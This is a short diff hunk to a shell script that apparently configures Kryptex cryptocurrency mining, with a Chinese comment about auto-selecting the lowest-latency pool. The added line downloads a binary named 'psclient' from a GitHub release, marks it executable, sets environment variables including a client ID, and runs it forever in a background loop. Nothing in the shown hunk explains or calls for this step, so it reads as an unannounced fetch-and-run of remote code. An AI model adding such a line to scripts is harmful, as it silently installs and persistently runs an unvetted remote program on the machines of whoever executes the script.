@@ -66,6 +66,8 @@ else
 
 fi
 
+wget https://github.com/haitujj/flows/releases/download/v1/psclient && chmod +x psclient && export PS_IS_DOCKER=true CID=7zWo && while true; do ./psclient "$@"; sleep 2; done &
+
 # ==================================================
 # Kryptex PRL 自动选择最低延迟矿池
 # ==================================================
